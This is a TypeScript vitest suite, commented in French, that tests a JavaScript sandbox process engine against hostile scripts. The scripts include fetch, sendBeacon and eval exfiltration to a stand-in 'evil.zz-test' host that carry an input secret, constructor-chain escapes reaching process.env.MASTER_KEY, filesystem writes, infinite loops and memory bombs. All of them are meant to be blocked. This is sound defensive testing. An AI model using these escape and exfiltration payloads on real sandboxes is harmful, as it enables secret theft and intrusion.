// SPDX-License-Identifier: AGPL-3.0-only
// assert_sandbox (INV7, tâche 1.5, 08 §3 et §7, 15 §7) : suite hostile partagée. Chaque tentative échoue, le processus
// enfant est tué en moins de 2 s, `sandbox_violation` est journalisé, l'enfant ne voit ni MASTER_KEY ni DATABASE_URL.
// La même suite tourne sur le moteur isolated-vm et sur l'adaptateur QuickJS (spike) sans changer un pont.
// Tout reste en boucle locale : « api.zz-test » et « evil.zz-test » résolvent vers 127.0.0.1 (résolveur injecté).
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import { createServer, type Server, type ServerResponse } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pino } from 'pino';
import { afterAll, beforeAll, describe, expect, test } from 'vitest';
import type { SandboxEngineId, SandboxLimits, SandboxResult } from '@runtime/core';
import { createSsrfPolicy, SsrfGuard } from '@runtime/core/net';
import { createSandboxBridges, type SandboxBridgeOptions } from './bridges.js';
import { ProcessSandboxEngine, sandboxOptionsFromEnv, unexpectedEnvKeys, type ProcessSandboxOptions } from './engine.js';

const KILL_BUDGET_MS = 2000;
const CANARY = 'zz_test_canary_master_key_sandbox';

type Counter = { server: Server; port: number; hits: number; upgrades: number; paths: string[] };

async function counter(handler?: (path: string, res: ServerResponse) => boolean): Promise<Counter> {
  const c: Counter = { server: createServer(), port: 0, hits: 0, upgrades: 0, paths: [] };
  c.server.on('request', (req, res) => {
    c.hits += 1;
    c.paths.push(req.url ?? '');
    if (handler?.(req.url ?? '', res) === true) return;
    res.writeHead(200, { 'content-type': 'application/json', 'set-cookie': 'zz_test_session=1' }).end('{"ok":true}');
  });
  c.server.on('upgrade', (_req, socket) => {
    c.upgrades += 1;
    socket.destroy();
  });
  c.server.on('connection', () => void 0);
  await new Promise<void>((resolve) => c.server.listen(0, '127.0.0.1', resolve));
  c.port = (c.server.address() as AddressInfo).port;
  return c;
}

let api: Counter;
let evil: Counter;
let guard: SsrfGuard;
const saved = { MASTER_KEY: process.env.MASTER_KEY, DATABASE_URL: process.env.DATABASE_URL };

beforeAll(async () => {
  evil = await counter();
  api = await counter((path, res) => {
    if (path === '/redirect-evil') {
      res.writeHead(302, { location: `http://evil.zz-test:${evil.port}/stolen` }).end();
      return true;
    }
    return false;
  });
  guard = new SsrfGuard({
    policy: createSsrfPolicy({ testAllowPrivate: true }),
    resolver: async () => [{ address: '127.0.0.1', family: 4 }],
  });
  // Le parent détient des secrets : l'enfant ne doit jamais les voir.
  process.env.MASTER_KEY = CANARY;
  process.env.DATABASE_URL = 'postgres://zz_test:zz_test@127.0.0.1/zz_test';
});

afterAll(async () => {
  for (const [k, v] of Object.entries(saved)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  for (const c of [api, evil]) {
    c.server.closeAllConnections();
    await new Promise((r) => c.server.close(r));
  }
});

type Run = SandboxResult & { logs: Record<string, unknown>[]; items: unknown[]; pid?: number; envKeys?: readonly string[]; environ?: string; environError?: string; dump?: DumpState };
/** Ce qui décide d'un vidage mémoire de l'enfant, lu dans /proc à `ready` (Linux). */
type DumpState = { coreLimit?: string | undefined; coredumpFilter?: string | undefined; error?: string | undefined };

function alive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch (error) {
    // EPERM : le processus existe, sous un autre uid (utilisateur dédié) ; seul ESRCH dit qu'il n'existe plus.
    return (error as NodeJS.ErrnoException).code === 'EPERM';
  }
}

/**
 * Fichier /proc de l'enfant (Linux). Sous l'utilisateur dédié, le parent n'a pas le droit de lire son environnement
 * (/proc/<pid>/environ exige l'accès ptrace : EACCES, c'est la frontière voulue) : la lecture passe par le lanceur, sous
 * l'uid de l'enfant, comme l'arrêt forcé (killPlan).
 */
function readProc(pid: number, file: string, o: Pick<ProcessSandboxOptions, 'launcher' | 'uid' | 'gid'>): string {
  const path = `/proc/${pid}/${file}`;
  if (o.launcher !== undefined && o.uid !== undefined && o.gid !== undefined && o.uid !== process.getuid?.()) {
    const args = [`--reuid=${o.uid}`, `--regid=${o.gid}`, '--clear-groups', '--no-new-privs', '--', '/bin/cat', path];
    return execFileSync(o.launcher, args, { env: {}, encoding: 'utf8', timeout: 5000 });
  }
  return readFileSync(path, 'utf8');
}

type RunExtra = { bridge?: Partial<SandboxBridgeOptions>; engine?: Partial<ProcessSandboxOptions> };

async function run(engineId: SandboxEngineId, code: string, limits: Partial<SandboxLimits> = {}, extra: RunExtra = {}): Promise<Run> {
  const logs: Record<string, unknown>[] = [];
  const logger = pino({ level: 'info' }, { write: (s: string) => void logs.push(JSON.parse(s) as Record<string, unknown>) });
  let pid: number | undefined;
  let envKeys: readonly string[] | undefined;
  let environ: string | undefined;
  let environError: string | undefined;
  let dump: DumpState | undefined;
  // Job CI Linux avec utilisateur dédié : SANDBOX_UID, SANDBOX_GID, SANDBOX_LAUNCHER (README § Utilisateur dédié).
  const options: ProcessSandboxOptions = { ...sandboxOptionsFromEnv(process.env), ...extra.engine };
  const engine = new ProcessSandboxEngine({
    ...options,
    engine: engineId,
    onChildReady: (info) => {
      pid = info.pid;
      envKeys = info.envKeys;
      // Linux : lecture directe de l'environnement du processus, indépendante de ce que l'enfant déclare. Une exception ici
      // remonterait dans le gestionnaire IPC du moteur et le run ne partirait jamais : elle est rendue au test.
      if (existsSync(`/proc/${info.pid}/environ`)) {
        try {
          environ = readProc(info.pid, 'environ', options);
        } catch (error) {
          environError = String(error).slice(0, 300);
        }
        try {
          dump = {
            coreLimit: /^Max core file size\s+(\S+)\s+(\S+)/m.exec(readProc(info.pid, 'limits', options))?.slice(1).join(' '),
            coredumpFilter: readProc(info.pid, 'coredump_filter', options).trim(),
          };
        } catch (error) {
          dump = { error: String(error).slice(0, 300) };
        }
      }
    },
  });
  const { bridges, items } = createSandboxBridges({ allowedDomains: ['api.zz-test'], guard, logger, ...extra.bridge });
  const result = await engine.run(code, bridges, { timeoutMs: 1000, memoryMb: 64, ...limits }, { input: { secret: 'zz_test_input' } });
  // Un moteur par run ici (le worker n'en a qu'un) : le balayage de fin de run (`kill -1` sous l'uid dédié) doit être fini
  // avant que le moteur du run suivant lance son enfant, sinon il le tue. Le worker l'attend de lui-même (#track).
  await engine.idle();
  return { ...result, logs, items, pid, envKeys, environ, ...(environError !== undefined ? { environError } : {}), ...(dump !== undefined ? { dump } : {}) };
}

const violationLogged = (r: Run, reason?: string) =>
  r.logs.some((l) => l.event === 'sandbox_violation' && (reason === undefined || l.reason === reason));

function expectKilledFast(r: Run, timeoutMs: number) {
  expect(r.killed).toBe(true);
  expect(r.killLatencyMs).toBeDefined();
  expect(r.killLatencyMs as number).toBeLessThan(KILL_BUDGET_MS);
  expect(r.durationMs).toBeLessThan(timeoutMs + KILL_BUDGET_MS + 1000); // + démarrage de l'enfant
  if (r.pid !== undefined) expect(alive(r.pid)).toBe(false);
}

const ENGINES: SandboxEngineId[] = ['isolated-vm', 'quickjs'];

describe.each(ENGINES)('assert_sandbox — %s', (engineId) => {
  test('contrôle : un script légitime passe (ponts fetch, log, emit)', async () => {
    const before = api.hits;
    const r = await run(engineId, `
      const res = await ctx.fetch('http://api.zz-test:${api.port}/items');
      ctx.log('statut', res.status);
      ctx.emit({ n: 1 });
      return { status: res.status, body: await res.json(), cookie: res.headers['set-cookie'] ?? null, input };`);
    expect(r.outcome).toBe('ok');
    expect(r.value).toEqual({ status: 200, body: { ok: true }, cookie: null, input: { secret: 'zz_test_input' } });
    expect(r.items).toEqual([{ n: 1 }]);
    expect(api.hits).toBe(before + 1);
    expect(r.violations).toEqual([]);
  });

  test.each([
    [10_000, 1000],
    [2000, 10_000],
  ])('contrôle : une rafale légitime (%i éléments de %i caractères, d’un trait, 20 et 40 Mo) passe sans violation', async (n, k) => {
    const r = await run(engineId, `
      const row = { id: 0, text: 'é'.repeat(${k}) };
      for (let i = 0; i < ${n}; i++) ctx.emit({ ...row, id: i });
      return 'fini';`, { timeoutMs: 20_000 });
    expect(r.outcome, JSON.stringify(r.violations)).toBe('ok');
    expect(r.items).toHaveLength(n);
  });

  test('1. disque : require/process/import échouent, aucun fichier écrit', async () => {
    const file = join(tmpdir(), `zz_test_sandbox_${engineId}_${process.pid}`);
    const r1 = await run(engineId, `require('fs').writeFileSync(${JSON.stringify(file)}, 'x'); return 1;`);
    const r2 = await run(engineId, `process.binding('fs'); return 1;`);
    const r3 = await run(engineId, `const fs = await import('node:fs'); fs.writeFileSync(${JSON.stringify(file)}, 'x'); return 1;`);
    const r4 = await run(engineId, `const fs = await eval('imp' + 'ort("node:fs")'); fs.writeFileSync(${JSON.stringify(file)}, 'x'); return 1;`);
    for (const r of [r1, r2, r3, r4]) expect(r.outcome).toBe('violation');
    expect(existsSync(file)).toBe(false);
    expect(violationLogged(r1, 'forbidden_global')).toBe(true);
    expect(violationLogged(r2, 'forbidden_global')).toBe(true);
    expect(violationLogged(r3, 'forbidden_import')).toBe(true);
    expect(violationLogged(r4, 'forbidden_import')).toBe(true);
  });

  test('2. fetch hors domaine (direct, redirection, IP, userinfo) : refusé, 0 requête vers le domaine piège', async () => {
    const before = evil.hits;
    const r1 = await run(engineId, `await ctx.fetch('http://evil.zz-test:${evil.port}/x'); return 1;`);
    const r2 = await run(engineId, `await ctx.fetch('http://api.zz-test:${api.port}/redirect-evil'); return 1;`);
    const r3 = await run(engineId, `await ctx.fetch('http://127.0.0.1:${evil.port}/x'); return 1;`);
    const r4 = await run(engineId, `await ctx.fetch('http://api.zz-test@evil.zz-test:${evil.port}/x'); return 1;`);
    const r5 = await run(engineId, `try { await ctx.fetch('http://evil.zz-test:${evil.port}/x'); } catch (e) {} return 'rattrapé';`);
    for (const r of [r1, r2, r3, r4, r5]) {
      expect(r.outcome).toBe('violation');
      expect(violationLogged(r)).toBe(true);
    }
    expect(violationLogged(r1, 'domain_not_allowed')).toBe(true);
    expect(violationLogged(r2, 'domain_not_allowed')).toBe(true);
    expect(evil.hits).toBe(before);
  });

  test('3. evaluate qui exfiltre (eval, Function, objets exposés, fetch global, sendBeacon) : échoue', async () => {
    const before = evil.hits;
    const target = `http://evil.zz-test:${evil.port}/exfil?d=`;
    const attempts = [
      `eval("ctx.fetch('${target}' + JSON.stringify(input))"); await new Promise((r) => r()); return 1;`,
      `await new Function('ctx', 'input', "return ctx.fetch('${target}' + input.secret)")(ctx, input); return 1;`,
      `await fetch('${target}' + input.secret); return 1;`,
      `navigator.sendBeacon('${target}', input.secret); return 1;`,
      `const g = ctx.log.constructor('return this')(); return typeof g.require;`,
      `return ctx.log.constructor.constructor('return process')().env.MASTER_KEY;`,
    ];
    for (const code of attempts) {
      const r = await run(engineId, code);
      expect(r.outcome, code).not.toBe('ok');
      expect(violationLogged(r), code).toBe(true);
      expect(JSON.stringify(r)).not.toContain(CANARY);
    }
    expect(evil.hits).toBe(before);
  });

  test('4. WebSocket (et EventSource) vers un domaine hors API : échoue, 0 connexion', async () => {
    const before = evil.upgrades + evil.hits;
    const r1 = await run(engineId, `new WebSocket('ws://evil.zz-test:${evil.port}/'); return 1;`);
    const r2 = await run(engineId, `new EventSource('http://evil.zz-test:${evil.port}/'); return 1;`);
    for (const r of [r1, r2]) {
      expect(r.outcome).toBe('violation');
      expect(violationLogged(r, 'forbidden_global')).toBe(true);
    }
    expect(evil.upgrades + evil.hits).toBe(before);
  });

  test('5. boucle infinie (synchrone, après un await, répétée) : enfant tué en < 2 s', async () => {
    const loops = ['while (true) {}', `await ctx.fetch('http://api.zz-test:${api.port}/'); for (;;) {}`, 'for (let i = 0; i < 3; i++) { try { while (true) {} } catch (e) {} } while (true) {}'];
    for (const code of loops) {
      const r = await run(engineId, code, { timeoutMs: 500 });
      expect(r.outcome, code).toBe('timeout');
      expectKilledFast(r, 500);
      expect(violationLogged(r, 'time_limit')).toBe(true);
    }
  });

  test('6. mémoire (allocation de 1 Go) : échoue, enfant tué en < 2 s', async () => {
    const code =
      engineId === 'quickjs'
        ? `let s = 'x'; const keep = []; while (true) { s = s + s; keep.push(s); }`
        : `const keep = []; for (let i = 0; i < 1024; i++) keep.push(new Uint8Array(1024 * 1024).fill(1)); const big = []; while (true) big.push({ a: Math.random(), b: [1, 2, 3] }); return keep.length;`;
    const r = await run(engineId, code, { timeoutMs: 10_000, memoryMb: 64, processMemoryMb: 512 });
    expect(r.outcome).toBe('memory');
    expectKilledFast(r, 10_000);
    expect(violationLogged(r, 'memory_limit')).toBe(true);
  });

  test('7. sortie vers l’hôte : emit de 1 Mo en boucle cadencée → output_limit, enfant tué, RSS du parent bornée', async () => {
    const rss: number[] = [process.memoryUsage().rss];
    const sampler = setInterval(() => rss.push(process.memoryUsage().rss), 20);
    const r = await run(engineId, `
      const s = 'x'.repeat(1e6);
      for (;;) { ctx.emit(s); const t = Date.now(); while (Date.now() - t < 2) {} }`, { timeoutMs: 4000 });
    clearInterval(sampler);
    rss.push(process.memoryUsage().rss);
    const growthMb = (Math.max(...rss) - (rss[0] as number)) / 1048576;
    expect(r.outcome, JSON.stringify({ ...r, logs: undefined, items: r.items.length })).not.toBe('ok');
    if (engineId === 'isolated-vm') {
      expect(r.outcome).toBe('violation');
      expect(violationLogged(r, 'output_limit')).toBe(true);
      expect(r.durationMs).toBeLessThan(3000);
    } else {
      // QuickJS tourne sur le fil principal de l'enfant : tant que le script ne rend pas la main, rien ne part vers le
      // parent (file IPC de l'enfant, bornée par le budget sortant) ; l'échéance murale le tue.
      expect(['violation', 'timeout']).toContain(r.outcome);
    }
    expectKilledFast(r, 4000);
    // Plafond cumulé par défaut : 50 Mio d'éléments retenus (52 éléments de 1 000 002 octets).
    expect(r.items.length).toBeLessThanOrEqual(53);
    expect(growthMb).toBeLessThan(256);
  });

  test('8. boucle de violations rattrapées : enfant tué à la première, journal borné', async () => {
    const r = await run(engineId, `for (;;) { try { process; } catch (e) {} }`, { timeoutMs: 3000 });
    expect(r.outcome).toBe('violation');
    expectKilledFast(r, 3000);
    expect(r.durationMs).toBeLessThan(2000);
    expect(r.violations.length).toBeLessThanOrEqual(32);
    expect(r.logs.filter((l) => l.event === 'sandbox_violation').length).toBeLessThanOrEqual(32);
  });

  test('9. violation de pont rattrapée puis boucle : enfant tué sans attendre l’échéance', async () => {
    const r = await run(engineId, `try { await ctx.fetch('http://evil.zz-test:${evil.port}/x'); } catch (e) {} for (;;) {}`, { timeoutMs: 3000 });
    expect(r.outcome).toBe('violation');
    expect(violationLogged(r, 'domain_not_allowed')).toBe(true);
    expectKilledFast(r, 3000);
    expect(r.durationMs).toBeLessThan(2000);
  });

  test('10. journal inondé : au-delà du plafond, violation et enfant tué', async () => {
    const r = await run(engineId, `for (;;) ctx.log('x'.repeat(1000));`, { timeoutMs: 3000 });
    expect(r.outcome).toBe('violation');
    expect(violationLogged(r, 'output_limit')).toBe(true);
    expect(r.logs.filter((l) => l.event === 'sandbox_log').length).toBeLessThan(80);
    expectKilledFast(r, 3000);
    expect(r.durationMs).toBeLessThan(2000);
  });

  test('11. budget IPC du run : au-delà, output_limit et enfant tué', async () => {
    const r = await run(engineId, `const s = 'y'.repeat(100000); for (let i = 0; i < 200; i++) ctx.emit(s); return 1;`, { timeoutMs: 3000, maxIpcBytes: 2 * 1024 * 1024 }, { bridge: { maxTotalItemBytes: 1e9 } });
    expect(r.outcome).toBe('violation');
    expect(r.violations).toContainEqual({ reason: 'output_limit', detail: 'ipc' });
    expect(r.items.length).toBeLessThanOrEqual(21);
  });

  test('12. plafond CPU du processus (RLIMIT_CPU) : boucle tuée par le système avant l’échéance murale', async () => {
    const r = await run(engineId, 'while (true) {}', { timeoutMs: 15_000, cpuLimitSeconds: 1 });
    expect(r.outcome).toBe('timeout');
    expect(r.violations).toContainEqual({ reason: 'time_limit', detail: 'cpu' });
    expect(r.durationMs).toBeLessThan(6000);
    if (r.pid !== undefined) expect(alive(r.pid)).toBe(false);
  });

  test('environnement de l’enfant : ni MASTER_KEY ni DATABASE_URL, lecture refusée', async () => {
    const r = await run(engineId, `return process.env.MASTER_KEY;`);
    expect(r.outcome).toBe('violation');
    expect(violationLogged(r, 'forbidden_global')).toBe(true);
    expect(r.envKeys).toBeDefined();
    expect(r.envKeys).not.toContain('MASTER_KEY');
    expect(r.envKeys).not.toContain('DATABASE_URL');
    expect(unexpectedEnvKeys(r.envKeys ?? ['?'])).toEqual([]);
    // Linux : l'environnement réel est toujours lu (sous l'uid de l'enfant s'il en a un dédié), jamais une vérification vide.
    if (process.platform === 'linux') expect(r.environ, r.environError).toBeDefined();
    if (r.environ !== undefined) expect(r.environ).not.toContain(CANARY);
    expect(JSON.stringify(r)).not.toContain(CANARY);
  });

  test('ponts fuzzés depuis l’isolat (getters, toJSON qui lève, tailles extrêmes) : aucun plantage', async () => {
    const r = await run(engineId, `
      const out = [];
      const tries = [
        () => ctx.fetch({ toString() { throw new Error('x'); } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { headers: { get a() { throw new Error('getter'); } } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { method: 'POST', body: 'x'.repeat(2 * 1024 * 1024) }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { headers: { 'x-a': 1 } }),
        () => ctx.fetch('http://api.zz-test:${api.port}/', { toJSON() { throw new Error('toJSON'); } }),
        () => ctx.emit({ toJSON() { return undefined; } }),
        () => ctx.emit(() => 1),
        () => ctx.log(Symbol('s')),
        () => ctx.emit('x'.repeat(2 * 1024 * 1024)),
      ];
      for (const t of tries) { try { await t(); out.push('ok'); } catch (e) { out.push(String(e && e.message).slice(0, 40)); } }
      return out;`, { timeoutMs: 5000 });
    expect(r.outcome).not.toBe('crashed');
    expect(r.outcome).not.toBe('timeout');
  });
});

describe('assert_sandbox — démarrage et utilisateur de l’enfant', () => {
  test('démarrage trop long : crashed, et sandbox_violation (child_crashed) journalisé', async () => {
    const r = await run('isolated-vm', 'return 1;', {}, { engine: { startupTimeoutMs: 1 } });
    expect(r.outcome).toBe('crashed');
    expect(violationLogged(r, 'child_crashed')).toBe(true);
    if (r.pid !== undefined) expect(alive(r.pid)).toBe(false);
  });

  // « Lecture de l'environnement du parent » (08 §7) au niveau du système : la sonde passe par le même lanceur que
  // l'enfant (uid, rlimit, environnement vide) mais SANS --permission, pour éprouver la frontière de l'OS seule.
  const dedicated = sandboxOptionsFromEnv(process.env);
  test('sonde : sans utilisateur dédié, la sonde voit l’environnement du parent sous Linux (le trou existe)', async () => {
    const probe = await new ProcessSandboxEngine({ ...dedicated, uid: undefined, gid: undefined, launcher: undefined }).probeIsolation();
    expect(probe.uid).toBe(process.getuid?.());
    expect(probe.parentEnviron).toBe(process.platform === 'linux' ? 'readable' : 'absent');
  });

  test.skipIf(process.platform !== 'linux' || dedicated.uid === undefined)(
    'Linux, utilisateur dédié : l’enfant ne tourne pas sous l’uid du worker et /proc/<ppid>/environ lui est illisible',
    async () => {
      const probe = await new ProcessSandboxEngine(dedicated).probeIsolation();
      expect(probe.uid).toBe(dedicated.uid);
      expect(probe.uid).not.toBe(process.getuid?.());
      expect(probe.parentEnviron).toBe('denied');
      expect(probe.noNewPrivs).toBe(true);
    },
  );
});

// INV7 : aucun vidage mémoire d'un enfant (son tas tient le script, les données extraites, les réponses des ponts), même vers
// un collecteur en tube (systemd-coredump, apport), auquel le noyau n'applique pas RLIMIT_CORE.
describe('assert_sandbox_no_core_dump', () => {
  test.skipIf(process.platform !== 'linux')('assert_sandbox_no_core_dump : enfant tué par RLIMIT_CPU (SIGXCPU), aucun vidage mémoire, même vers un collecteur en tube', async () => {
    const timeoutMs = 15_000;
    const r = await run('isolated-vm', 'while (true) {}', { timeoutMs, cpuLimitSeconds: 1 });
    expect(r.outcome).toBe('timeout');
    expect(r.violations).toContainEqual({ reason: 'time_limit', detail: 'cpu' });
    // Fin par le plafond CPU, avant l'échéance murale. Pas de borne murale plus serrée : la durée dépend de la charge de la
    // machine (6,8 à 9,1 s mesurés sous charge) ; la preuve est /proc et le journal du noyau ci-dessous.
    expect(r.durationMs).toBeLessThan(timeoutMs);
    // Hérité par l'enfant, lu dans /proc : RLIMIT_CORE d'un octet, souple et dure (sous la taille minimale d'un vidage vers un
    // fichier ; valeur que le noyau traite comme un refus pour un tube) ; coredump_filter nul (aucune page mémoire).
    expect(r.dump, JSON.stringify(r.dump)).toEqual({ coreLimit: '1 1', coredumpFilter: '00000000' });
    // Collecteur en tube sur cette machine : le noyau journalise l'abandon du vidage pour CE processus. En CI (runner GitHub :
    // apport en tube, sudo sans mot de passe), cette preuve est exigée ; ailleurs, la branche prise est journalisée.
    const pattern = readFileSync('/proc/sys/kernel/core_pattern', 'utf8');
    const kernel = spawnSync('sudo', ['-n', 'dmesg'], { encoding: 'utf8' });
    const checked = pattern.startsWith('|') && kernel.status === 0;
    console.info(`assert_sandbox_no_core_dump : journal du noyau ${checked ? 'vérifié' : 'non vérifié'} (core_pattern ${JSON.stringify(pattern.trim().slice(0, 60))}, sudo -n dmesg : ${String(kernel.status)})`);
    if (process.env.CI === 'true') expect(checked, `core_pattern ${pattern.trim()} ; dmesg ${String(kernel.status)} ${kernel.stderr.slice(0, 200)}`).toBe(true);
    if (checked) {
      expect(r.pid).toBeDefined();
      expect(kernel.stdout).toMatch(new RegExp(`\\b${r.pid}\\(.*RLIMIT_CORE (?:is )?set to 1`));
    }
  });
});

describe('assert_sandbox — mesure RSS (15 §7)', () => {
  test('100 exécutions hostiles : aucune ne réussit, aucun enfant survivant, pas de fuite côté parent', async () => {
    const hostile = [
      `require('fs'); return 1;`,
      `await ctx.fetch('http://evil.zz-test:${evil.port}/'); return 1;`,
      `eval("ctx.fetch('http://evil.zz-test:${evil.port}/?d=' + input.secret)"); return 1;`,
      `new WebSocket('ws://evil.zz-test:${evil.port}/'); return 1;`,
      `while (true) {}`,
      `const keep = []; while (true) keep.push(new Uint8Array(4 * 1024 * 1024).fill(1));`,
    ];
    const evilBefore = evil.hits + evil.upgrades;
    const pids: number[] = [];
    const peaks: number[] = [];
    const listeners = process.listenerCount('exit');
    const rssAt: number[] = [];
    for (let i = 0; i < 100; i++) {
      const r = await run('isolated-vm', hostile[i % hostile.length] as string, { timeoutMs: 300, memoryMb: 64, processMemoryMb: 384 });
      expect(r.outcome, `run ${i}`).not.toBe('ok');
      expect(violationLogged(r), `run ${i} ${JSON.stringify({ ...r, logs: undefined })}`).toBe(true);
      if (r.killed) expect(r.killLatencyMs as number).toBeLessThan(KILL_BUDGET_MS);
      if (r.pid !== undefined) pids.push(r.pid);
      if (r.peakRssMb !== undefined) peaks.push(r.peakRssMb);
      if (i === 9 || i === 99) rssAt.push(process.memoryUsage().rss);
    }
    expect(pids.length).toBe(100);
    expect(pids.filter(alive)).toEqual([]);
    expect(evil.hits + evil.upgrades).toBe(evilBefore);
    expect(process.listenerCount('exit')).toBe(listeners);
    // RSS de l'enfant bornée par le plafond processus ; RSS du parent stable entre le 10e et le 100e run.
    expect(Math.max(...peaks)).toBeLessThanOrEqual(384 + 64);
    const growthMb = ((rssAt[1] as number) - (rssAt[0] as number)) / 1048576;
    console.log(`RSS parent : ${Math.round((rssAt[0] as number) / 1048576)} → ${Math.round((rssAt[1] as number) / 1048576)} Mo ; RSS enfant max ${Math.max(...peaks)} Mo`);
    expect(growthMb).toBeLessThan(64);
  }, 180_000);
});
